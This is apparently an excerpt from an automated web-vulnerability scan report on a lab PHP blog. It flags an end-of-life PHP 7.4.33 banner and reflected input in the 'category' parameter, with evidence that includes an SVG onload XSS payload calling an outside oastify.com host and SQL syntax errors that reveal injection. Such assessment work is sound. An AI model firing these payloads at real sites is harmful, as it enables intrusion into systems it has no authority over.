+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32868/ and observe response header `X-Powered-By: PHP/7.4.33` (also present on /index.php). 2. Map 7.4.33 to the PHP release calendar: 7.4 EOL = 2022-11-28; 7.4.33 is the last 7.4 build. 3. Any PHP-core CVE published after 2022-11-28 (e.g. CVE-2023-3824, CVE-2023-3823, CVE-2022-31631) is unpatched. Negative control: a non-existent path returns a 404 (distinct status/length) used to anchor the live-host baseline; positives: two stable 200 banner pages.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1n0g8-27</code> — <code>artifacts/_/ev-mqz1n0g8-27/</code></div><div class="lbl">REQUEST</div><pre>GET /verdict-nonexistent-path-404 HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Mon, 29 Jun 2026 09:57:00 GMT
+keep-alive: timeout=5, max=98
+server: Apache/2.4.54 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32868&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1mz5h-25</code> — <code>artifacts/_/ev-mqz1mz5h-25/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 5630
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 09:56:58 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;div class='post'&gt;
+                    &lt;h2&gt;The Magic of Morning Dew&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Sunset Serenades&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Forest Whisperings&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Decoding Tech Trends&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Future of Robotics&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Mediterranean Diet Secrets&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Art of French Baking&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Master the art of French baking with these simple steps for making the perfect croissant....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Beyond the Camera Lens&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Urban Photography Tips&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Healing Power of Yoga&lt;/h2&gt;
+                    &lt;p&gt;Category: Health&lt;/p&gt;
+                    &lt;img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....&lt;/p&gt;
+                &lt;/div&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1mzmx-26</code> — <code>artifacts/_/ev-mqz1mzmx-26/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 5630
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 09:56:59 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;div class='post'&gt;
+                    &lt;h2&gt;The Magic of Morning Dew&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Sunset Serenades&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Forest Whisperings&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Decoding Tech Trends&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Future of Robotics&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Mediterranean Diet Secrets&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Art of French Baking&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Master the art of French baking with these simple steps for making the perfect croissant....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Beyond the Camera Lens&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Urban Photography Tips&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Healing Power of Yoga&lt;/h2&gt;
+                    &lt;p&gt;Category: Health&lt;/p&gt;
+                    &lt;img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....&lt;/p&gt;
+                &lt;/div&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 4. [burp✓] Input returned in response (reflected)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">✅ AI-verified by active re-test: Control (category=allcategories) returned no injected markup; both positive replays returned my injected `&quot;&gt;&lt;svg&gt;` verbatim and unencoded inside the SQL error message — byte-identical (1665 bytes), confirming stable reflection of input into the response. (severity raised info→high: confirmed real, not info-only)
+
+The value of the &lt;b&gt;category&lt;/b&gt; request parameter is copied into the application's response. (confidence: CERTAIN) @ http://target.local:32868/</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1r358-29</code> — <code>artifacts/_/ev-mqz1r358-29/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32868
+
+GET /?category='%22%3e%3csvg%2fonload%3dfetch%60%2f%2fi2lvglvhrq8vojpvxne5w4nkcbi56xzznrdf42uqj%5c.oastify.com%60%3e HTTP/1.1
+Host: target.local:32868
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 200 OK
+Date: Mon, 29 Jun 2026 10:00:03 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Vary: Accept-Encoding
+Content-Length: 1712
+Content-Type: text/html; charset=UTF-8
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot;&gt;&lt;svg/onload=fetch`//i2lvglvhrq8vojpvxne5w4nkcbi56xzznrdf42uqj\.oastify.com`&gt;' ' at line 1</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1ruyk-2a</code> — <code>artifacts/_/ev-mqz1ruyk-2a/</code></div><div class="lbl">REQUEST</div><pre>GET /?category=allcategories HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-encoding: gzip
+content-length: 510
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 10:00:46 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;p&gt;No posts found.&lt;/p&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1rwib-2b</code> — <code>artifacts/_/ev-mqz1rwib-2b/</code></div><div class="lbl">REQUEST</div><pre>GET /?category=UMBRA7317%27%22%3E%3Csvg%3E HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-encoding: gzip
+content-length: 608
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 10:00:48 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    Error in query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot;&gt;&lt;svg&gt;' ORDER BY created_at DESC' at line 1</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1ry21-2c</code> — <code>artifacts/_/ev-mqz1ry21-2c/</code></div><div class="lbl">REQUEST</div><pre>GET /?category=UMBRA7317%27%22%3E%3Csvg%3E HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-encoding: gzip
+content-length: 608
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 10:00:50 GMT
+keep-alive: timeout=5, max=98
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.4.33
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
